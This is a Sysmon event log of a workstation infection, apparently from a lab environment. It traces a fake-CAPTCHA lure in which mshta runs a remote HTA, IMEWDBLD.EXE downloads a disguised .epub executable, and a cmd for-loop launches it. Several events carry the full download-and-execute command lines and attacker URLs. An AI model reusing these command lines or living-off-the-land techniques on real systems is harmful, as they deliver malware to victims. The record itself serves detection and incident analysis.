- <EventData>
  <Data Name="RuleName">-</Data> 
  <Data Name="EventType">CreateKey</Data> 
  <Data Name="UtcTime">2025-08-05 09:01:59.350</Data> 
  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
  <Data Name="ProcessId">17852</Data> 
  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software</Data> 
  <Data Name="User">MEGACORPONE\a.smith</Data> 
  </EventData>
  </Event>

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
  <EventID>12</EventID> 
  <Version>2</Version> 
  <Level>4</Level> 
  <Task>12</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8000000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-05T09:01:59.3495146Z" /> 
  <EventRecordID>692616</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="3796" ThreadID="4896" /> 
  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
  <Computer>WK001.megacorpone.com</Computer> 
  <Security UserID="S-1-5-18" /> 
  </System>
- <EventData>
  <Data Name="RuleName">-</Data> 
  <Data Name="EventType">CreateKey</Data> 
  <Data Name="UtcTime">2025-08-05 09:01:59.348</Data> 
  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
  <Data Name="ProcessId">17852</Data> 
  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies\Microsoft\SystemCertificates</Data> 
  <Data Name="User">MEGACORPONE\a.smith</Data> 
  </EventData>
  </Event>

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
  <EventID>12</EventID> 
  <Version>2</Version> 
  <Level>4</Level> 
  <Task>12</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8000000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-05T09:01:59.3494802Z" /> 
  <EventRecordID>692615</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="3796" ThreadID="4896" /> 
  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
  <Computer>WK001.megacorpone.com</Computer> 
  <Security UserID="S-1-5-18" /> 
  </System>
- <EventData>
  <Data Name="RuleName">-</Data> 
  <Data Name="EventType">CreateKey</Data> 
  <Data Name="UtcTime">2025-08-05 09:01:59.348</Data> 
  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
  <Data Name="ProcessId">17852</Data> 
  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies\Microsoft</Data> 
  <Data Name="User">MEGACORPONE\a.smith</Data> 
  </EventData>
  </Event>

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
  <EventID>12</EventID> 
  <Version>2</Version> 
  <Level>4</Level> 
  <Task>12</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8000000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-05T09:01:59.3494646Z" /> 
  <EventRecordID>692614</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="3796" ThreadID="4896" /> 
  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
  <Computer>WK001.megacorpone.com</Computer> 
  <Security UserID="S-1-5-18" /> 
  </System>
- <EventData>
  <Data Name="RuleName">-</Data> 
  <Data Name="EventType">CreateKey</Data> 
  <Data Name="UtcTime">2025-08-05 09:01:59.348</Data> 
  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
  <Data Name="ProcessId">17852</Data> 
  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies</Data> 
  <Data Name="User">MEGACORPONE\a.smith</Data> 
  </EventData>
  </Event>

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
  <EventID>12</EventID> 
  <Version>2</Version> 
  <Level>4</Level> 
  <Task>12</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8000000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-05T09:01:59.3494450Z" /> 
  <EventRecordID>692613</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="3796" ThreadID="4896" /> 
  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
  <Computer>WK001.megacorpone.com</Computer> 
  <Security UserID="S-1-5-18" /> 
  </System>
- <EventData>
  <Data Name="RuleName">-</Data> 
  <Data Name="EventType">CreateKey</Data> 
  <Data Name="UtcTime">2025-08-05 09:01:59.348</Data> 
  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
  <Data Name="ProcessId">17852</Data> 
  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software</Data> 
  <Data Name="User">MEGACORPONE\a.smith</Data> 
  </EventData>
  </Event>

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
  <EventID>11</EventID> 
  <Version>2</Version> 
  <Level>4</Level> 
  <Task>11</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8000000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-05T09:01:28.7794135Z" /> 
  <EventRecordID>692600</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="3796" ThreadID="4896" /> 
  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
  <Computer>WK001.megacorpone.com</Computer> 
  <Security UserID="S-1-5-18" /> 
  </System>
- <EventData>
  <Data Name="RuleName">-</Data> 
  <Data Name="UtcTime">2025-08-05 09:01:28.777</Data> 
  <Data Name="ProcessGuid">{8404bf77-2fd6-688b-3000-000000000c00}</Data> 
  <Data Name="ProcessId">2536</Data> 
  <Data Name="Image">C:\WINDOWS\system32\svchost.exe</Data> 
  <Data Name="TargetFilename">C:\Windows\Prefetch\CAPTCHA_PRIVACY[1].EPUB-44387CB3.pf</Data> 
  <Data Name="CreationUtcTime">2025-08-05 09:01:28.777</Data> 
  <Data Name="User">NT AUTHORITY\SYSTEM</Data> 
  </EventData>
  </Event>

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
  <EventID>22</EventID> 
  <Version>5</Version> 
  <Level>4</Level> 
  <Task>22</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8000000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-05T09:01:21.0687841Z" /> 
  <EventRecordID>692598</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="3796" ThreadID="4944" /> 
  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
  <Computer>WK001.megacorpone.com</Computer> 
  <Security UserID="S-1-5-18" /> 
  </System>
- <EventData>
  <Data Name="RuleName">-</Data> 
  <Data Name="UtcTime">2025-08-05 09:01:05.373</Data> 
  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
  <Data Name="ProcessId">17852</Data> 
  <Data Name="QueryName">qqqqqqqqqqqqqqqq.org</Data> 
  <Data Name="QueryStatus">9003</Data> 
  <Data Name="QueryResults">-</Data> 
  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
  <Data Name="User">MEGACORPONE\a.smith</Data> 
  </EventData>
  </Event>

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
  <EventID>1</EventID> 
  <Version>5</Version> 
  <Level>4</Level> 
  <Task>1</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8000000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-05T09:01:18.6739263Z" /> 
  <EventRecordID>692541</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="3796" ThreadID="4896" /> 
  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
  <Computer>WK001.megacorpone.com</Computer> 
  <Security UserID="S-1-5-18" /> 
  </System>
- <EventData>
  <Data Name="RuleName">-</Data> 
  <Data Name="UtcTime">2025-08-05 09:01:18.672</Data> 
  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0f37-000000000c00}</Data> 
  <Data Name="ProcessId">19068</Data> 
  <Data Name="Image">C:\Windows\System32\conhost.exe</Data> 
  <Data Name="FileVersion">10.0.26100.4202 (WinBuild.160101.0800)</Data> 
  <Data Name="Description">Console Window Host</Data> 
  <Data Name="Product">Microsoft® Windows® Operating System</Data> 
  <Data Name="Company">Microsoft Corporation</Data> 
  <Data Name="OriginalFileName">CONHOST.EXE</Data> 
  <Data Name="CommandLine">\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1</Data> 
  <Data Name="CurrentDirectory">C:\WINDOWS</Data> 
  <Data Name="User">MEGACORPONE\a.smith</Data> 
  <Data Name="LogonGuid">{8404bf77-2fdf-688b-718a-080000000000}</Data> 
  <Data Name="LogonId">0x88a71</Data> 
  <Data Name="TerminalSessionId">1</Data> 
  <Data Name="IntegrityLevel">Medium</Data> 
  <Data Name="Hashes">SHA1=7357D28F791C37831135A8ACD9EAEB3356CBDD07,MD5=D4C588A47AF08B2BC335C8AB37C4B5E7,SHA256=2D8C0A3E77D6B7B0619EA8EE282CD5D73E2F6A79BF8B3339611AB8BB5E8704E4,IMPHASH=7E0C49E135633E325641729D15CD6CC7</Data> 
  <Data Name="ParentProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
  <Data Name="ParentProcessId">17852</Data> 
  <Data Name="ParentImage">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
  <Data Name="ParentCommandLine">"C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub"</Data> 
  <Data Name="ParentUser">MEGACORPONE\a.smith</Data> 
  </EventData>
  </Event>

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
  <EventID>1</EventID> 
  <Version>5</Version> 
  <Level>4</Level> 
  <Task>1</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8000000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-05T09:01:18.6648988Z" /> 
  <EventRecordID>692539</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="3796" ThreadID="4896" /> 
  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
  <Computer>WK001.megacorpone.com</Computer> 
  <Security UserID="S-1-5-18" /> 
  </System>
- <EventData>
  <Data Name="RuleName">-</Data> 
  <Data Name="UtcTime">2025-08-05 09:01:18.635</Data> 
  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
  <Data Name="ProcessId">17852</Data> 
  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
  <Data Name="FileVersion">-</Data> 
  <Data Name="Description">-</Data> 
  <Data Name="Product">-</Data> 
  <Data Name="Company">-</Data> 
  <Data Name="OriginalFileName">-</Data> 
  <Data Name="CommandLine">"C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub"</Data> 
  <Data Name="CurrentDirectory">C:\Windows\System32\</Data> 
  <Data Name="User">MEGACORPONE\a.smith</Data> 
  <Data Name="LogonGuid">{8404bf77-2fdf-688b-718a-080000000000}</Data> 
  <Data Name="LogonId">0x88a71</Data> 
  <Data Name="TerminalSessionId">1</Data> 
  <Data Name="IntegrityLevel">Medium</Data> 
  <Data Name="Hashes">SHA1=0088671F4D025F08B3F600BDC3C8BEEAD1D89FF3,MD5=15B211B8D6C2760E4E9BB221D59A0355,SHA256=A88FEDC93A1D80C8CEA08FBCB6B001293DDF357E27D268B32C5CFD23A49E96ED,IMPHASH=D4E9F9D732B17B7FF9FE06A68EFA86E9</Data> 
  <Data Name="ParentProcessGuid">{8404bf77-c85e-6891-0c37-000000000c00}</Data> 
  <Data Name="ParentProcessId">3396</Data> 
  <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data> 
  <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe" /c for /r "C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache" %i in (*.epub) do (start "" "%i" & exit)</Data> 
  <Data Name="ParentUser">MEGACORPONE\a.smith</Data> 
  </EventData>
  </Event>

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
  <EventID>11</EventID> 
  <Version>2</Version> 
  <Level>4</Level> 
  <Task>11</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8000000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-05T09:01:16.4634115Z" /> 
  <EventRecordID>692477</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="3796" ThreadID="4896" /> 
  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
  <Computer>WK001.megacorpone.com</Computer> 
  <Security UserID="S-1-5-18" /> 
  </System>
- <EventData>
  <Data Name="RuleName">-</Data> 
  <Data Name="UtcTime">2025-08-05 09:01:16.462</Data> 
  <Data Name="ProcessGuid">{8404bf77-c85c-6891-0837-000000000c00}</Data> 
  <Data Name="ProcessId">15956</Data> 
  <Data Name="Image">C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE</Data> 
  <Data Name="TargetFilename">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
  <Data Name="CreationUtcTime">2025-08-05 09:01:16.462</Data> 
  <Data Name="User">MEGACORPONE\a.smith</Data> 
  </EventData>
  </Event>

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
  <EventID>1</EventID> 
  <Version>5</Version> 
  <Level>4</Level> 
  <Task>1</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8000000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-05T09:01:16.4092700Z" /> 
  <EventRecordID>692476</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="3796" ThreadID="4896" /> 
  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
  <Computer>WK001.megacorpone.com</Computer> 
  <Security UserID="S-1-5-18" /> 
  </System>
- <EventData>
  <Data Name="RuleName">-</Data> 
  <Data Name="UtcTime">2025-08-05 09:01:16.399</Data> 
  <Data Name="ProcessGuid">{8404bf77-c85c-6891-0837-000000000c00}</Data> 
  <Data Name="ProcessId">15956</Data> 
  <Data Name="Image">C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE</Data> 
  <Data Name="FileVersion">10.0.26100.3624 (WinBuild.160101.0800)</Data> 
  <Data Name="Description">Microsoft IME Open Extended Dictionary Module</Data> 
  <Data Name="Product">Microsoft® Windows® Operating System</Data> 
  <Data Name="Company">Microsoft Corporation</Data> 
  <Data Name="OriginalFileName">imewdbld.exe</Data> 
  <Data Name="CommandLine">"C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE" http://news.axonbyte.org:8000/captcha_privacy.epub</Data> 
  <Data Name="CurrentDirectory">C:\WINDOWS\System32\</Data> 
  <Data Name="User">MEGACORPONE\a.smith</Data> 
  <Data Name="LogonGuid">{8404bf77-2fdf-688b-718a-080000000000}</Data> 
  <Data Name="LogonId">0x88a71</Data> 
  <Data Name="TerminalSessionId">1</Data> 
  <Data Name="IntegrityLevel">Medium</Data> 
  <Data Name="Hashes">SHA1=116139F3E810C94E63DB1E87F33D4523FB8465E1,MD5=ED3D5A3A64B50479D722E4A10474E0AC,SHA256=9A9DE1F75FBF831C56B5A9A6608E22E5C518CEA0534FDB7FFD39E8B5AA2D95B1,IMPHASH=E52462BA6DE9C2A1D63372A5F062D715</Data> 
  <Data Name="ParentProcessGuid">{8404bf77-c85c-6891-0737-000000000c00}</Data> 
  <Data Name="ParentProcessId">19424</Data> 
  <Data Name="ParentImage">C:\Windows\System32\mshta.exe</Data> 
  <Data Name="ParentCommandLine">"C:\WINDOWS\System32\mshta.exe" http://pfusioncaptcha.com/13221442.hta</Data> 
  <Data Name="ParentUser">MEGACORPONE\a.smith</Data> 
  </EventData>
  </Event>